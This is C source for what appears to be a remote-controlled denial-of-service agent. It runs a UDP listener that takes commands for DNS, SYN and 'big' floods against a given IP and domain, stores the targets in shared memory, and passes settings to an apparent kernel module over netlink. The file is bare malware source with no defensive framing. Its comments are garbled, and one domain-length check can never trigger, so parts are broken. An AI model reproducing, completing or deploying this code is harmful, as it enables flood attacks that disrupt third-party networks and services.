#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <memory.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <unistd.h>

#include <stdio.h>

#include <stdlib.h>

#include <sys/socket.h>

#include <sys/types.h>

#include <string.h>

#include <asm/types.h>

#include <linux/netlink.h>

#include <linux/socket.h>

#include <linux/if.h>

#include <sys/shm.h>

#include "atk.h"

struct sockaddr_nl src_addr, dest_addr;

struct nlmsghdr *nlh = NULL;

struct iovec iov;

int sock_fd;

struct msghdr msg;

#define ETH_ALEN	6		/* Octets in one ethernet addr	 */

	int shmid;

struct atk_info atk_info,*atk_info_p;

int call_mod(struct atk_info *atk_info_p)

{
        sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ATK_ETH);

        memset(&msg, 0, sizeof(msg));

        memset(&src_addr, 0, sizeof(src_addr));

        src_addr.nl_family = AF_NETLINK;

        src_addr.nl_pid = getpid(); /* self pid */

        src_addr.nl_groups = 0; /* not in mcast groups */

        bind(sock_fd, (struct sockaddr*)&src_addr, sizeof(src_addr));

        memset(&dest_addr, 0, sizeof(dest_addr));

        dest_addr.nl_family = AF_NETLINK;

        dest_addr.nl_pid = 0; /* For Linux Kernel */

        dest_addr.nl_groups = 0; /* unicast */



        nlh=(struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct atk_info)));

        /* Fill the netlink message header */

        nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct atk_info));

        nlh->nlmsg_pid = getpid(); /* self pid */

        nlh->nlmsg_flags = 0;

        /* Fill in the netlink message payload */

		atk_info_p->degree=30000;

        memcpy(NLMSG_DATA(nlh), atk_info_p, sizeof(struct atk_info)); 



        iov.iov_base = (void *)nlh;

        iov.iov_len = nlh->nlmsg_len;

        msg.msg_name = (void *)&dest_addr;

        msg.msg_namelen = sizeof(dest_addr);

        msg.msg_iov = &iov;

        msg.msg_iovlen = 1;

		/*printf(" call websyn. ...\n");*/
		sendmsg(sock_fd, &msg, 0);

		/* Read message from kernel */
		memset(nlh, 0, NLMSG_SPACE(sizeof(int)));
		/*printf(" Waiting message. ...\n");*/
		recvmsg(sock_fd, &msg, 0);
		printf(".");
		/*printf(" Received message payload: %d\n",*((int *)NLMSG_DATA(nlh)));*/

         /* Close Netlink Socket */
		free(nlh);
        close(sock_fd);

}


unsigned char tmp_domain[255];

void udp_server(int sockfd, struct sockaddr *pcliaddr, socklen_t clilen)
{
	socklen_t len;


	for(;;)
	{
		int i,n;
		char *p=NULL;
		
		recvfrom(sockfd, &atk_info, sizeof(struct atk_info), 0, pcliaddr, &len);/*∂¡»°√¸¡Ó*/
		if(atk_info.atk_type==DNS_FLOOD)
		{
			printf("DNS_FLOOD\n");
			memcpy(atk_info_p,&atk_info,sizeof(struct atk_info));
			memcpy(tmp_domain+1,atk_info.domain,strlen(atk_info.domain)+1);
		
			if(strlen(tmp_domain)<3&&strlen(tmp_domain)>255)
				break;

			for(i=0,tmp_domain[0]='.';;i++)
			{
					if(tmp_domain[i]=='.')
					{
							for(n=0,p=&tmp_domain[i],p++;*p!='.'&&*p!='\0';n++,p++);

							tmp_domain[i]=n;

							if(*p=='\0')
									break;
					}
			}
			printf("atk ip: %d.%d.%d.%d  domain: %s \n",atk_info.dst_ip>>24,atk_info.dst_ip>>16&0xff,atk_info.dst_ip>>8&0xff,atk_info.dst_ip&0xff,tmp_domain);
			memcpy(atk_info_p->domain,tmp_domain,sizeof(unsigned char)*255);
		}
		else if(atk_info.atk_type==SYN_FLOOD)
		{
			printf("SYN_FLOOD\n");
			memcpy(atk_info_p,&atk_info,sizeof(struct atk_info));
		}
		else if(atk_info.atk_type==ATK_STATE)
		{printf("ATK_STATE\n");
			memcpy(&atk_info,atk_info_p,sizeof(struct atk_info));
			sendto(sockfd, &atk_info, sizeof(struct atk_info), 0, pcliaddr, len);/*∂¡»°√¸¡Ó*/
		}
		else if(atk_info.atk_type==BIG_FLOOD)
		{	
			printf("BIG_FLOOD\n");
			memcpy(atk_info_p,&atk_info,sizeof(struct atk_info));
		}
		else if(atk_info.atk_type==ADD_ADDR)
		{
			printf("ADD_ADDR\n");
			call_mod(&atk_info);
		}
		else if(atk_info.atk_type==LST_LEVEL)
		{
			printf("LST_LEVEL\n");
			call_mod(&atk_info);
		}
		else if(atk_info.atk_type==LST_CLEAN)
		{	
			printf("LST_CLEAN\n");
			call_mod(&atk_info);
		}
		else if(atk_info.atk_type==LST_DEFAULT)
		{
			printf("LST_DEFAULT\n");
			call_mod(&atk_info);
		}
		else
		{printf("STOP\n");
			atk_info_p->atk_type=0;
		}
	}
}

main()
{
	#define MAX 100
	int fd;
	unsigned ip;
	int i,n;
	char *p=NULL;


	int sockfd;
	struct sockaddr_in servaddr, cliaddr;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0); 

	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servaddr.sin_port = htons(SERV_PORT);

	if(bind(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
	{
		perror("bind error");
		exit(1);
	}
	shmid  = shmget(KEY,sizeof(struct atk_info),IPC_CREAT|0600|IPC_PRIVATE);

	atk_info_p = (struct atk_info*)shmat(shmid,NULL,0);

	udp_server(sockfd, (struct sockaddr *)&cliaddr, sizeof(cliaddr));
}
